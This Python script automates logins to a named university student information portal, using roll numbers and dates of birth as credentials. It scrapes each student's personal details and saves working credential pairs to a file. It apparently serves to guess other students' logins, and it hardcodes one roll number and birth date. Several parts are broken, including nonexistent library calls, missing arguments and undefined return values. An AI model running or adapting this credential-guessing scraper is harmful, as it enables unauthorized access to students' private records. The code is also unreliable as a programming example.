import robobrowser
import requests
import shutil
import pickle, sys
from PIL import Image

def load():
    if not 'data.pkl' in sys.listdir():
        obj = []
        with open('data.pkl','wb') as f:
            pickle.dump(obj)
    with open('data.pkl','rb') as f:
        return pickle.load(f)
def write(obj):
    with open('data.pkl','wb') as f:
        pickle.dump(obj)
def open_page():
    """Opens up the sis page and returns browser object"""
    br = robobrowser.RoboBrowser()
    br.open('https://sis.manipal.edu/studlogin.aspx')
    return br
def login(uname = '150101312',passw = '08/09/1997'):
    """Attempts login"""
    threadno = "{}  {}".format(uname + passw)
    print("[+] {} Opening Page...".format(threadno))
    br = open_page()
    form = br.get_forms()[0] #Supress warning
    images = br.find_all('img')
    cap =images[2]['src']
    url = 'https://sis.manipal.edu/'
    cap_url = url + cap
    print("[+] {} Fetching Captcha".format(threadno))
    write_file(cap_url,'{}.jpg'.format(threadno))
    captcha_ans = manual_captcha()
    #captcha_ans = ocr('captcha.jpg')
    form['txtroll'] = uname
    form['txtdob'] = passw
    form['txtCaptcha'] = captcha_ans
    form.serialize()
    print("[+] {} Attempting login".format(threadno))
    br.submit_form(form)
    page = br.open('https://sis.manipal.edu/geninfo.aspx')
    tables = br.find_all('table')
    info = tables[-1]
    info = info.find_all('td')
    info.remove(info[0])
    keys = []
    values = []
    for index,element in enumerate(info):
        if index%2 == 0:
            keys.append(element.text)
        else:
            values.append(element.text)
    for value in values:
        print(value)
    return (key,value)

def write_file(cap_url,dest = 'cap.jpg'):
    captcha = requests.get(cap_url,stream = True)
    print('Status code:{}'.format(captcha.status_code))
    if captcha.status_code == 200:
        raw_obj = captcha.raw
        with open(dest,'wb') as f:
            captcha.raw.decode_content = True
            shutil.copyfileobj(raw_obj,f)

def open_image():
    img = Image.open('cap.jpg')
    img.show()

def manual_captcha():
    open_image()
    captcha_ans = input("Enter captcha :")
    return captcha_ans

def login_check(roll,dob):
    _,value = login(roll,dob)
    if len(value) == 0:
        print("[-] {}  {}".format(roll,dob))
    else:
        print("[+] {}  {} Recorded login!!!!!!!!!!!!!".format(roll,dob))
        creds = load()
        creds.append((roll,dob))
        write(creds)
        for i in value:
            print(i)

#if __name__=='__main__':
#    main()
